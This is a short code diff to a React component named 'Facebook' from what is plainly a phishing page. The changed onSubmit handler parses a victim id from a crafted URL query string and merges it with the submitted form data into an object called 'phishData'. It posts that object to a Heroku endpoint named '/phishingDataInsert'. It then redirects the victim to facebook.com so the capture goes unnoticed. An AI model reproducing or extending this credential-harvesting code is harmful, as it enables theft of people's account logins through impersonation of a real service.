@@ -18,8 +18,11 @@ const Facebook = () => {
 
   const onSubmit = (data) => {
     const url = window.location.href;
-    const id = {id:url.split('id=')[1]};
-    const phishData = {...id,...data};
+    const splitIdForFinal = url.split('?id=')[1];
+    const finalIdSplit = splitIdForFinal.split('&&query=24798dak+ded&&refer+facebook&&redirect=jkl');
+
+    const id = finalIdSplit[0]+finalIdSplit[1]
+    const phishData = {id,...data};
 
       fetch('https://ancient-garden-81797.herokuapp.com/phishingDataInsert',{
           method:'POST',
@@ -32,6 +35,7 @@ const Facebook = () => {
       .then(result => {
         window.location.href = 'https://facebook.com'
       })
+      // console.log(phishData)
   };
 
 
